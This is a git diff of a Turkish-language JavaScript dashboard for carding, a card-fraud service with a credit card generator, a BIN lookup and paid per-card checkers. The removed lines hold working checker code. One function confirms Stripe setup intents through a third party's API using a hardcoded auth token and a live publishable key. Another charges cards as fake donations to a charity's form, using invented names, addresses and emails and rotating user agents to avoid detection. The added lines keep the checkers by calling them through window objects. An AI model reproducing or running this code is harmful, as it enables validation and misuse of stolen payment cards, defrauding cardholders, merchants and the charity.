@@ -19,7 +19,7 @@
 
     if (isBanned(session.email)) {
         localStorage.removeItem('ccSession');
-        alert('Your account has been permanently banned!');
+        alert('🚫 Hesabınız kalıcı olarak yasaklanmıştır!');
         window.location.href = 'index.html';
         return;
     }
@@ -35,11 +35,8 @@
         return;
     }
 
-    // ---- ADMIN KONTROLÜ ----
-    let isAdmin = false;
-    if (session.email === 'apomuhammed1@gmail.com') {
-        isAdmin = true;
-    }
+    // ---- ADMIN KONTROLÜ (SADECE ADMIN EMAIL) ----
+    const isAdmin = session.email === 'apomuhammed1@gmail.com';
 
     const userId = currentUser.userId;
     let displayName = currentUser.displayName || currentUser.email.split('@')[0];
@@ -70,43 +67,6 @@
     function getGameRemain(key, max) {
         const data = getGameLimit(key, max);
         return max - data.count;
-    }
-
-    // ---- RANDOM USER-AGENT ----
-    function getRandomUserAgent() {
-        const agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
-        ];
-        return agents[Math.floor(Math.random() * agents.length)];
-    }
-
-    // ---- RANDOM AD, ADRES, MAIL ----
-    function randomName() {
-        const first = ['Ahmet', 'Mehmet', 'Ali', 'Veli', 'Ayse', 'Fatma', 'Zeynep', 'Elif', 'Can', 'Ece', 'Bora', 'Deniz', 'Selin', 'Mert', 'Leyla'];
-        const last = ['Yilmaz', 'Demir', 'Kaya', 'Cinar', 'Celik', 'Kara', 'Aydin', 'Sahin', 'Erdem', 'Kurt', 'Koc', 'Tas', 'Arslan', 'Keskin', 'Ozturk'];
-        return { first: first[Math.floor(Math.random() * first.length)], last: last[Math.floor(Math.random() * last.length)] };
-    }
-
-    function randomAddress() {
-        const streets = ['Ataturk Cad.', 'Istiklal Sok.', 'Cumhuriyet Mah.', 'Bahariye Cad.', 'Bagdat Cad.', 'Abdi Ipekci Cad.', 'Nisantasi Mah.', 'Bebek Sok.'];
-        const cities = ['Istanbul', 'Ankara', 'Izmir', 'Bursa', 'Antalya', 'Konya', 'Adana', 'Gaziantep', 'Mersin', 'Diyarbakir'];
-        const countries = ['Turkey', 'USA', 'UK', 'Germany', 'France', 'Canada', 'Italy', 'Spain'];
-        return {
-            street: streets[Math.floor(Math.random() * streets.length)] + ' ' + (Math.floor(Math.random() * 200) + 1),
-            city: cities[Math.floor(Math.random() * cities.length)],
-            postal: String(Math.floor(Math.random() * 90000) + 10000),
-            country: countries[Math.floor(Math.random() * countries.length)]
-        };
-    }
-
-    function randomEmail() {
-        const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'protonmail.com'];
-        const name = randomName();
-        return name.first.toLowerCase() + '.' + name.last.toLowerCase() + Math.floor(Math.random() * 1000) + '@' + domains[Math.floor(Math.random() * domains.length)];
     }
 
     // ---- DOM ----
@@ -147,43 +107,7 @@
     const adminLabel = $('adminLabel');
     const adminPanelBtn = $('adminPanelBtn');
 
-    // ---- Toggle'lar ----
-    const toolsToggle = $('toolsToggle');
-    const toolsSub = $('toolsSub');
-    const checkoutToggle = $('checkoutToggle');
-    const checkoutSub = $('checkoutSub');
-    const gamesToggle = $('gamesToggle');
-    const gamesSub = $('gamesSub');
-    const otherToolsToggle = $('otherToolsToggle');
-    const otherToolsSub = $('otherToolsSub');
-
-    if (toolsToggle) {
-        toolsToggle.addEventListener('click', function() {
-            this.classList.toggle('open');
-            toolsSub.classList.toggle('open');
-        });
-    }
-    if (checkoutToggle) {
-        checkoutToggle.addEventListener('click', function(e) {
-            e.stopPropagation();
-            this.classList.toggle('open');
-            checkoutSub.classList.toggle('open');
-        });
-    }
-    if (gamesToggle) {
-        gamesToggle.addEventListener('click', function() {
-            this.classList.toggle('open');
-            gamesSub.classList.toggle('open');
-        });
-    }
-    if (otherToolsToggle) {
-        otherToolsToggle.addEventListener('click', function() {
-            this.classList.toggle('open');
-            otherToolsSub.classList.toggle('open');
-        });
-    }
-
-    // ---- RADYO ----
+    // ---- RADYO (MÜZİK) ----
     const songs = ['Dertlimusic.mp3', 'Allahyok.mp3', 'Tamam.mp3', 'Ehlan.mp3', 'Anani.mp3', 'Feryat.mp3', 'Vuruldu.mp3'];
     let currentSongIndex = 0;
     let audio = null;
@@ -232,7 +156,7 @@
             isMusicPlaying = true;
             audio.play().catch(() => {});
         }
-        showToast('Music changed', 'info');
+        showToast('⏪ Müzik değiştirildi', 'info');
     }
 
     function nextSong() {
@@ -242,11 +166,10 @@
             isMusicPlaying = true;
             audio.play().catch(() => {});
         }
-        showToast('Music changed', 'info');
+        showToast('⏩ Müzik değiştirildi', 'info');
     }
 
     function updateRadioUI() {
-        const radioToggle = $('radioToggle');
         if (radioToggle) {
             radioToggle.innerHTML = isMusicPlaying ? '<i class="fas fa-music"></i>' : '<i class="fas fa-music-slash"></i>';
             radioToggle.classList.toggle('active', isMusicPlaying);
@@ -260,6 +183,20 @@
     if (radioToggle) radioToggle.addEventListener('click', toggleMusic);
     if (radioPrev) radioPrev.addEventListener('click', prevSong);
     if (radioNext) radioNext.addEventListener('click', nextSong);
+
+    // ---- RANDOM USER AGENT ----
+    const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
+    ];
+
+    function getRandomUserAgent() {
+        return userAgents[Math.floor(Math.random() * userAgents.length)];
+    }
 
     // ---- BIN API ----
     async function lookupBIN(bin) {
@@ -286,6 +223,42 @@
             console.error('BIN API Error:', e);
             return null;
         }
+    }
+
+    // ---- Toggle'lar ----
+    const toolsToggle = $('toolsToggle');
+    const toolsSub = $('toolsSub');
+    const checkoutToggle = $('checkoutToggle');
+    const checkoutSub = $('checkoutSub');
+    const gamesToggle = $('gamesToggle');
+    const gamesSub = $('gamesSub');
+    const otherToolsToggle = $('otherToolsToggle');
+    const otherToolsSub = $('otherToolsSub');
+
+    if (toolsToggle) {
+        toolsToggle.addEventListener('click', function() {
+            this.classList.toggle('open');
+            toolsSub.classList.toggle('open');
+        });
+    }
+    if (checkoutToggle) {
+        checkoutToggle.addEventListener('click', function(e) {
+            e.stopPropagation();
+            this.classList.toggle('open');
+            checkoutSub.classList.toggle('open');
+        });
+    }
+    if (gamesToggle) {
+        gamesToggle.addEventListener('click', function() {
+            this.classList.toggle('open');
+            gamesSub.classList.toggle('open');
+        });
+    }
+    if (otherToolsToggle) {
+        otherToolsToggle.addEventListener('click', function() {
+            this.classList.toggle('open');
+            otherToolsSub.classList.toggle('open');
+        });
     }
 
     // ---- ONLINE ----
@@ -350,104 +323,11 @@
         if (first === '4') return 'Visa';
         if (first === '5') return 'MasterCard';
         if (card.startsWith('34') || card.startsWith('37')) return 'Amex';
-        if (card.startsWith('6')) return 'Discover';
+        if (first === '6') return 'Discover';
         return 'Visa';
     }
 
-    // ============================================================
-    // STRIPE AUTH (DÜZELTİLDİ)
-    // ============================================================
-    function formatCCStripe(line) {
-        try {
-            const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
-            if (parts.length < 4) return null;
-            let cc = parts[0].replace(/\D/g, '');
-            let mm = parts[1].replace(/\D/g, '');
-            let yy = parts[2].replace(/\D/g, '');
-            let cvv = parts[3].replace(/\D/g, '');
-            if (mm.length === 1) mm = '0' + mm;
-            else if (mm.length > 2) mm = mm.slice(-2);
-            if (yy.length === 4) yy = yy.slice(-2);
-            return { cc, mm, yy, cvv };
-        } catch (e) { return null; }
-    }
-
-    async function stripeAuthCheck(cc, mm, yy, cvv) {
-        try {
-            const authToken = 'Possessor 1I1/xy0GbbDYwK5xkCXVxANB+NryBfyb17Wyqph2LyBehTPQ/2Za96UQi2CC3+NRDN2GCelfjjKXnxt77Bkp31OsHImCIVCedbXB+LCn8a2g4qQaLFFwSH3W9txaXhHJJcCZez1XzZ9Ceae+WoyjyLrjx/i3G20JUe+JalsAOcNqmv5bFrFXnWHK+0Cv5Me8xqTehJKekS1ykD6IbO6+s+k19WSiuTupXLT8ukPSUQc04IkDIOzoJVLFJRmrC+onZ7I6BWFWSaP27qddLdssE4plPAgdIiH6pCXbVDZCW2a+pQVA1IUiZAdYdLSLUA8/bG03JFuQ/WE/1axeUqujZCNzxpnvu30cN11LQCBjNtjuugBH7yOanNO9t9DIgGKmlabVUatpX3dEP+ceyimRkDIceHmLwUDVJpTVtqgYgIje6ELTniGXsCOY0i501fLFFocg9me6cSnn9eHPcFgXXbmuIpHUW6342fyxhai3pDCADyAEEGI6esi7GSxv2kIUX6q+5g/vDHR9Rn4v3HpWjXuCMs+wIw95+a4ZeEPBEaQ4uPeIFBAQ/4A9OmhWQV7gQ1f6BQnL8m8rFng8qr7O0/sqRo/PEutKWrBc6F19DyjJ4X7lhXIkoV8gFJmbcCfogwgkn/g15meQmm3Q6s+pmGqktTXoeeiZN6MZJSvwoHla/sqVnU3T6kymP5F+YexTNMuTahioNpe3Nw0xl4TbOwhPahPbxPZdg+o8SUsVTEma29DeGJpbm9yrQOBKxkXHtxSCQ8EsIWe/2YEGQoS/OSlvjPLAxjOdF1gZAvteSZym+ivBZPeOWO/oPnmynTHoY+fHBn1rzxI2qhtRYOpaxjJk4Y+VNdfRSiX9y4DPUdIBISgim4p30sYjNQxSnufXsJyDHEhuWxyr1Zc8oGRCeLX7omb/rkH8+361TFFHyAu4RPqJAnpWrPpFWe1nU99VvrE8cf7J94o01kalK9MmeDJiI+JuJ4+31cEQ4xtjJqlqgLfEZ1etNP1gIPl+Pfzx';
-
-            const urlCreate = 'https://vibz.stwpower.com/power_bank/api/bankcard/stripe/createSetupIntent?language=ger';
-            const headersCreate = {
-                'User-Agent': getRandomUserAgent(),
-                'Content-Type': 'application/json; charset=utf-8',
-                'Accept-Language': 'tr-TR,tr;q=0.9',
-                'Authorization': authToken
-            };
-
-            const respCreate = await fetch(urlCreate, {
-                method: 'POST',
-                headers: headersCreate,
-                body: JSON.stringify({})
-            });
-
-            const textCreate = await respCreate.text();
-            const match = textCreate.match(/(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)/);
-            if (!match) {
-                return 'Declined! (client_secret not found)';
-            }
-            const clientSecret = match[1];
-            const intentId = clientSecret.split('_secret_')[0];
-
-            const urlConfirm = `https://api.stripe.com/v1/setup_intents/${intentId}/confirm`;
-            const payload = new URLSearchParams();
-            payload.append('client_secret', clientSecret);
-            payload.append('expand[0]', 'payment_method');
-            payload.append('payment_method_data[allow_redisplay]', 'unspecified');
-            payload.append('payment_method_data[billing_details][address][country]', 'TR');
-            payload.append('payment_method_data[card][cvc]', cvv);
-            payload.append('payment_method_data[card][exp_month]', mm);
-            payload.append('payment_method_data[card][exp_year]', yy);
-            payload.append('payment_method_data[card][number]', cc);
-            payload.append('payment_method_data[payment_user_agent]', 'stripe-ios/23.27.6; variant.legacy; PaymentSheet');
-            payload.append('payment_method_data[type]', 'card');
-            payload.append('use_stripe_sdk', 'true');
-
-            const headersConfirm = {
-                'User-Agent': getRandomUserAgent(),
-                'x-stripe-user-agent': '{"version":"0.37.3","url":"https:\\/\\/github.com\\/stripe\\/stripe-react-native","type":"iPad15,3","lang":"objective-c","name":"@stripe\\/stripe-react-native","bindings_version":"23.27.6","model":"iPad","vendor_identifier":"B0C09781-0D45-4FCD-BCD0-AE0A46B41CDC","os_version":"18.6","partner_id":""}',
-                'stripe-version': '2020-08-27',
-                'authorization': 'Bearer pk_live_51ONMPJCYEondzKCZD7N8xv2rgbCsyLOv2tEYGupao0fdROvY0DrlEZh1gUKuofYPBfD8NK35GGAV6t4OBMjHuIA200FTFfkaiy',
-                'accept-language': 'tr-TR,tr;q=0.9',
-                'Content-Type': 'application/x-www-form-urlencoded'
-            };
-
-            const respConfirm = await fetch(urlConfirm, {
-                method: 'POST',
-                headers: headersConfirm,
-                body: payload
-            });
-
-            const json = await respConfirm.json();
-
-            if (json.error) {
-                const msg = json.error.message || 'Unknown error';
-                return `Declined! (${msg})`;
-            }
-
-            const status = json.status;
-            if (status === 'succeeded') {
-                return 'Approved! (AUTHED)';
-            } else if (status === 'requires_action' || status === 'requires_source_action') {
-                return '3D Secure! (3DS)';
-            } else {
-                return `Declined! (UNKNOWN STATUS - ${status})`;
-            }
-        } catch (err) {
-            return `Error: ${err.message.slice(0, 50)}`;
-        }
-    }
-
-    // ---- STRIPE AUTH UI ----
+    // ---- STRIPE AUTH (window.StripeAuth kullanıyor) ----
     const stripeInput = $('stripeInput');
     const stripePasteBtn = $('stripePasteBtn');
     const stripeCheckBtn = $('stripeCheckBtn');
@@ -468,7 +348,7 @@
         else if (filter === 'dead') filtered = stripeResults.filter(r => !r.status.includes('Approved') && !r.status.includes('3D Secure'));
 
         if (!filtered.length) {
-            stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">No results.</div>';
+            stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">Sonuç yok.</div>';
             return;
         }
         let html = '';
@@ -509,9 +389,9 @@
                     return l;
                 });
                 stripeInput.value = cleaned.join('\n');
-                showToast('Pasted and cleaned.', 'success');
+                showToast('Panodan yapıştırıldı ve temizlendi.', 'success');
             } catch (e) {
-                showToast('Cannot read clipboard, paste manually.', 'error');
+                showToast('Pano okunamadı, manuel yapıştır.', 'error');
             }
         });
     }
@@ -519,50 +399,48 @@
     if (stripeCheckBtn) {
         stripeCheckBtn.addEventListener('click', async function() {
             const lines = stripeInput.value.split('\n').map(l => l.trim()).filter(l => l);
-            if (!lines.length) { showToast('Enter cards.', 'error'); return; }
+            if (!lines.length) { showToast('Kart girin.', 'error'); return; }
 
             const cost = lines.length * 3;
             if (currentUser.balance < cost) {
-                showToast(`Insufficient balance! Need ${cost} TL (3 TL/card).`, 'error');
+                showToast(`Yetersiz bakiye! ${cost} TL gerekli (3 TL/kart).`, 'error');
                 return;
             }
 
             stripeResults = [];
-            stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">Checking...</div>';
+            stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">Kontrol ediliyor...</div>';
             this.disabled = true;
-            this.textContent = 'Checking...';
+            this.textContent = 'Kontrol ediliyor...';
 
             try {
                 for (const line of lines) {
-                    const formatted = formatCCStripe(line);
+                    const formatted = window.StripeAuth.formatCC(line);
                     if (!formatted) {
-                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: 'Format Error' });
+                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: '❌ Format Hatası' });
                         continue;
                     }
                     const { cc, mm, yy, cvv } = formatted;
-                    const result = await stripeAuthCheck(cc, mm, yy, cvv);
+                    const result = await window.StripeAuth.check(cc, mm, yy, cvv);
                     stripeResults.push({ cc, mm, yy, cvv, status: result });
                     updateStripeCounts();
                     renderStripeResults('all');
                 }
             } catch (err) {
-                showToast('Error occurred during check.', 'error');
+                showToast('Kontrol sırasında hata oluştu.', 'error');
             } finally {
                 currentUser.balance -= cost;
                 saveUsers();
                 updateUI();
                 stripeInput.value = '';
                 this.disabled = false;
-                this.textContent = 'Start Check (3 TL/card)';
+                this.textContent = '▶️ Başlat (3 TL/kart)';
                 updateStripeCounts();
-                stripeResult.innerHTML = '';
                 renderStripeResults('all');
-                showToast(`Checked ${lines.length} cards. Cost: ${cost} TL deducted.`, 'success');
+                showToast(`✅ ${lines.length} kart kontrol edildi. ${cost} TL düşüldü.`, 'success');
             }
         });
     }
 
-    // Filtreleme
     if (liveFilterBtn) liveFilterBtn.addEventListener('click', function() {
         [liveFilterBtn, deadFilterBtn, allFilterBtn].forEach(b => b.classList.remove('active'));
         this.classList.add('active');
@@ -579,9 +457,7 @@
         renderStripeResults('all');
     });
 
-    // ============================================================
-    // BAMBORA CUSTOM CHARGE
-    // ============================================================
+    // ---- BAMBORA CHARGE (window.BamboraAuth kullanıyor) ----
     const bamboraInput = $('bamboraInput');
     const bamboraAmount = $('bamboraAmount');
     const bamboraCheckBtn = $('bamboraCheckBtn');
@@ -595,128 +471,19 @@
 
     let bamboraResults = [];
 
-    async function bamboraCharge(card, month, year, cvv, amount) {
-        try {
-            const fullYear = year.length === 2 ? '20' + year : year;
-            const cardType = getCardType(card);
-            const name = randomName();
-            const address = randomAddress();
-            const email = randomEmail();
-
-            // 1. Token al
-            const tokenHeaders = {
-                'Accept': '*/*',
-                'Content-Type': 'text/plain; charset=UTF-8',
-                'Origin': 'https://libs.na.bambora.com',
-                'Referer': 'https://libs.na.bambora.com/',
-                'User-Agent': getRandomUserAgent()
-            };
-
-            const tokenData = JSON.stringify({
-                number: card,
-                expiry_month: month,
-                expiry_year: fullYear,
-                cvd: cvv
-            });
-
-            const tokenResp = await fetch('https://api.na.bambora.com/scripts/tokenization/tokens', {
-                method: 'POST',
-                headers: tokenHeaders,
-                body: tokenData
-            });
-
-            const tokenJson = await tokenResp.json();
-            const token = tokenJson.token || '';
-            if (!token) {
-                return { status: 'Token error', live: false };
-            }
-
-            // 2. Ödeme gönder
-            const formData = new URLSearchParams();
-            formData.append('amount', amount);
-            formData.append('donor_type', 'Personal');
-            formData.append('company', '');
-            formData.append('honour', '');
-            formData.append('supportDedication', '');
-            formData.append('supportDedicationName', '');
-            formData.append('supportCardName_first', '');
-            formData.append('supportCardName_last', '');
-            formData.append('supportCardStreetAddr', '');
-            formData.append('supportCardCity', '');
-            formData.append('supportCardPostalCode', '');
-            formData.append('supportCardCountry', 'Canada');
-            formData.append('supportCardCadProv', '');
-            formData.append('supportCardUsState', '');
-            formData.append('supportCardMessage', '');
-            formData.append('supportDesignation', 'Greatest Need');
-            formData.append('specificCampaign', '');
-            formData.append('card_name', name.first + ' ' + name.last);
-            formData.append('FirstName', name.first);
-            formData.append('LastName', name.last);
-            formData.append('Email', email);
-            formData.append('primaryPhone', '');
-            formData.append('address_lookup', '');
-            formData.append('StreetAddr', address.street);
-            formData.append('City', address.city);
-            formData.append('PostalCode', address.postal);
-            formData.append('country', 'TR');
-            formData.append('CadProv', '');
-            formData.append('UsState', '');
-            formData.append('act', 'pay');
-            formData.append('province', '');
-            formData.append('supportCardProvince', '');
-            formData.append('CreditCardType', cardType);
-            formData.append('token', token);
-            formData.append('GACampaign', 'not set');
-            formData.append('GASource', 'direct');
-            formData.append('GAMedium', 'direct');
-            formData.append('lang_pref', 'undefined');
-            formData.append('bot_check', '');
-            formData.append('language', 'e');
-            formData.append('source_form', '');
-
-            const postHeaders = {
-                'User-Agent': getRandomUserAgent(),
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://donate.kinvia.ca',
-                'Referer': 'https://donate.kinvia.ca/single.php'
-            };
-
-            const postResp = await fetch('https://donate.kinvia.ca/donate.php', {
-                method: 'POST',
-                headers: postHeaders,
-                body: formData
-            });
-
-            const text = await postResp.text();
-
-            // Yanıt analizi
-            if (text.includes('TRANSACTION SUCCESSFUL') || text.includes('Thank you') || text.includes('success')) {
-                return { status: 'Approved!', live: true };
-            } else if (text.includes('TRANSACTION UNSUCCESSFUL') || text.includes('declined') || text.includes('error')) {
-                return { status: 'Declined!', live: false };
-            } else {
-                return { status: 'Unknown response', live: false };
-            }
-
-        } catch (err) {
-            return { status: 'Error: ' + err.message.slice(0, 40), live: false };
-        }
-    }
-
     function renderBamboraResults(filter = 'all') {
         let filtered = [];
         if (filter === 'all') filtered = bamboraResults;
-        else if (filter === 'live') filtered = bamboraResults.filter(r => r.live === true);
-        else if (filter === 'dead') filtered = bamboraResults.filter(r => r.live === false);
+        else if (filter === 'live') filtered = bamboraResults.filter(r => r.status.includes('Approved') || r.status.includes('charged'));
+        else if (filter === 'dead') filtered = bamboraResults.filter(r => !r.status.includes('Approved') && !r.status.includes('charged'));
 
         if (!filtered.length) {
-            bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">No results.</div>';
+            bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">Sonuç yok.</div>';
             return;
         }
         let html = '';
         filtered.forEach(r => {
-            const statusColor = r.live ? '#34c759' : '#ff3b30';
+            const statusColor = r.status.includes('Approved') || r.status.includes('charged') ? '#34c759' : '#ff3b30';
             html += `
                 <div style="padding:4px 0;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
                     <span style="font-family:monospace;">Card: ${r.cc}|${r.mm}|${r.yy}|${r.cvv}</span>
@@ -728,7 +495,7 @@
     }
 
     function updateBamboraCounts() {
-        const live = bamboraResults.filter(r => r.live === true).length;
+        const live = bamboraResults.filter(r => r.status.includes('Approved') || r.status.includes('charged')).length;
         const dead = bamboraResults.length - live;
         bamboraLiveCount.textContent = live;
         bamboraDeadCount.textContent = dead;
@@ -738,51 +505,48 @@
     if (bamboraCheckBtn) {
         bamboraCheckBtn.addEventListener('click', async function() {
             const lines = bamboraInput.value.split('\n').map(l => l.trim()).filter(l => l);
+            if (!lines.length) { showToast('Kart girin.', 'error'); return; }
+
             const amount = parseFloat(bamboraAmount.value);
-            if (!lines.length) { showToast('Enter cards.', 'error'); return; }
-            if (!amount || amount <= 0) { showToast('Enter a valid amount.', 'error'); return; }
+            if (!amount || amount <= 0) { showToast('Geçerli bir miktar girin.', 'error'); return; }
 
             const cost = lines.length * 2;
             if (currentUser.balance < cost) {
-                showToast(`Insufficient balance! Need ${cost} TL (2 TL/card).`, 'error');
+                showToast(`Yetersiz bakiye! ${cost} TL gerekli (2 TL/kart).`, 'error');
                 return;
             }
 
             bamboraResults = [];
-            bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">Checking...</div>';
+            bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">Kontrol ediliyor...</div>';
             this.disabled = true;
-            this.textContent = 'Checking...';
+            this.textContent = 'Kontrol ediliyor...';
 
             try {
                 for (const line of lines) {
-                    const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
-                    if (parts.length < 4) {
-                        bamboraResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: 'Format Error', live: false });
+                    const formatted = window.BamboraAuth.formatCC(line);
+                    if (!formatted) {
+                        bamboraResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: '❌ Format Hatası' });
                         continue;
                     }
-                    const cc = parts[0].replace(/\D/g, '');
-                    const mm = parts[1].replace(/\D/g, '').padStart(2, '0').slice(0, 2);
-                    const yy = parts[2].replace(/\D/g, '').slice(0, 2);
-                    const cvv = parts[3].replace(/\D/g, '').slice(0, 4);
-
-                    const result = await bamboraCharge(cc, mm, yy, cvv, amount);
-                    bamboraResults.push({ cc, mm, yy, cvv, status: result.status, live: result.live });
+                    const { cc, mm, yy, cvv } = formatted;
+                    const result = await window.BamboraAuth.check(cc, mm, yy, cvv, amount);
+                    bamboraResults.push({ cc, mm, yy, cvv, status: result });
                     updateBamboraCounts();
                     renderBamboraResults('all');
+                    await new Promise(r => setTimeout(r, 500));
                 }
             } catch (err) {
-                showToast('Error occurred.', 'error');
+                showToast('Kontrol sırasında hata oluştu.', 'error');
             } finally {
                 currentUser.balance -= cost;
                 saveUsers();
                 updateUI();
                 bamboraInput.value = '';
                 this.disabled = false;
-                this.textContent = 'Start Bambora (2 TL/card)';
+                this.textContent = '▶️ Başlat (2 TL/kart)';
                 updateBamboraCounts();
-                bamboraResult.innerHTML = '';
                 renderBamboraResults('all');
-                showToast(`Checked ${lines.length} cards. Cost: ${cost} TL deducted.`, 'success');
+                showToast(`✅ ${lines.length} kart kontrol edildi. ${cost} TL düşüldü.`, 'success');
             }
         });
     }
@@ -828,15 +592,14 @@
         if (userBioInput) userBioInput.value = userBio || '';
         if (themeSelect) themeSelect.value = document.documentElement.getAttribute('data-theme') || 'light';
 
-        const isRealAdmin = session.email === 'apomuhammed1@gmail.com';
         if (adminPanelBtn) {
-            adminPanelBtn.style.display = isRealAdmin ? 'flex' : 'none';
+            adminPanelBtn.style.display = isAdmin ? 'flex' : 'none';
         }
         if (adminNavItem) {
-            adminNavItem.style.display = isRealAdmin ? 'flex' : 'none';
+            adminNavItem.style.display = isAdmin ? 'flex' : 'none';
         }
         if (adminLabel) {
-            adminLabel.style.display = isRealAdmin ? 'block' : 'none';
+            adminLabel.style.display = isAdmin ? 'block' : 'none';
         }
 
         if (spinUsed) {
@@ -871,7 +634,7 @@
         navItems.forEach(item => { if (item) item.classList.toggle('active', item.dataset.tab === tabId); });
         updatePageTitle(tabId);
         if (tabId === 'dashboard') updateUI();
-        if (tabId === 'admin' && session.email === 'apomuhammed1@gmail.com') {
+        if (tabId === 'admin' && isAdmin) {
             if (adminLock) { adminLock.style.display = 'block';
                 adminContent.style.display = 'none';
                 adminLockError.style.display = 'none';
@@ -897,22 +660,22 @@
 
     function updatePageTitle(tabId) {
         const titles = {
-            dashboard: { title: 'Home', sub: 'Overview' },
-            generator: { title: 'CC Generator', sub: 'Card generator' },
-            validator: { title: 'CC Validator', sub: 'Card validation' },
-            binsorgu: { title: 'BIN Lookup', sub: 'BIN information' },
-            stripeauth: { title: 'Stripe Auth', sub: 'Card authorization' },
-            bambora: { title: 'Bambora Charge', sub: 'Custom amount charge' },
-            wheel: { title: 'Spin Wheel', sub: 'Daily free spin!' },
-            guess: { title: 'Guess Number', sub: 'Guess 1-100' },
-            coinflip: { title: 'Coin Flip', sub: 'Try your luck' },
-            dice: { title: 'Dice Roll', sub: 'Try your luck' },
-            rps: { title: 'Rock Paper Scissors', sub: 'Play vs computer' },
-            bakiye: { title: 'Balance', sub: 'Balance management' },
-            chat: { title: 'Chat', sub: 'Room chat' },
-            ai: { title: 'Zenit AI', sub: 'AI assistant' },
-            ayarlar: { title: 'Settings', sub: 'Profile settings' },
-            admin: { title: 'Admin Panel', sub: 'User management' }
+            dashboard: { title: 'Ana Sayfa', sub: 'Genel bakış' },
+            generator: { title: 'CC Generator', sub: 'Kart üretici' },
+            validator: { title: 'CC Validator', sub: 'Kart doğrulama' },
+            binsorgu: { title: 'BIN Sorgu', sub: 'BIN bilgileri' },
+            stripeauth: { title: 'Stripe Auth', sub: 'Kart yetkilendirme' },
+            bambora: { title: 'Bambora Charge', sub: 'Özel miktar ile kart kontrolü' },
+            wheel: { title: 'Çarkıfelek', sub: 'Günlük ücretsiz çevir!' },
+            guess: { title: 'Sayı Tahmin', sub: '1-100 arası tahmin' },
+            coinflip: { title: 'Yazı Tura', sub: 'Şansını dene' },
+            dice: { title: 'Zar At', sub: 'Şansını dene' },
+            rps: { title: 'Taş Kağıt Makas', sub: 'Bilgisayara karşı oyna' },
+            bakiye: { title: 'Bakiye', sub: 'Bakiye yönetimi' },
+            chat: { title: 'Sohbet', sub: 'Oda sohbeti' },
+            ai: { title: 'Zenit AI', sub: 'Yapay zeka asistanı' },
+            ayarlar: { title: 'Ayarlar', sub: 'Profil bilgileri' },
+            admin: { title: 'Admin Paneli', sub: 'Kullanıcı yönetimi' }
         };
         const info = titles[tabId] || titles.dashboard;
         pageTitle.textContent = info.title;
@@ -932,7 +695,7 @@
     if (generateBtn) {
         generateBtn.addEventListener('click', function() {
             if (currentUser.balance < 1) {
-                showToast('Insufficient balance!', 'error');
+                showToast('Yetersiz bakiye!', 'error');
                 return;
             }
             const bin = genBin.value.trim() || '411111';
@@ -940,7 +703,7 @@
             const month = genMonth.value.trim() || '12';
             const year = genYear.value.trim() || '2028';
             const count = parseInt(genCount.value) || 5;
-            if (count < 1 || count > 50) { showToast('Count must be 1-50.', 'error'); return; }
+            if (count < 1 || count > 50) { showToast('Adet 1-50 arası olmalı.', 'error'); return; }
 
             currentUser.balance -= 1;
             saveUsers();
@@ -949,16 +712,16 @@
             for (let i = 0; i < count; i++) {
                 let card = generateCC(bin, 16);
                 const isValid = luhnCheck(card);
-                const status = isValid ? 'Valid' : 'Invalid';
+                const status = isValid ? '✅' : '❌';
                 const statusColor = isValid ? '#34c759' : '#ff3b30';
                 html += `<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border-color);font-family:monospace;">
                     <span>${card}|${month}|${year}|${cvv}</span>
                     <span style="color:${statusColor};font-weight:600;">${status}</span>
                 </div>`;
             }
-            ccList.innerHTML = html || '<div style="color:var(--text-muted);text-align:center;padding:16px;">No cards generated.</div>';
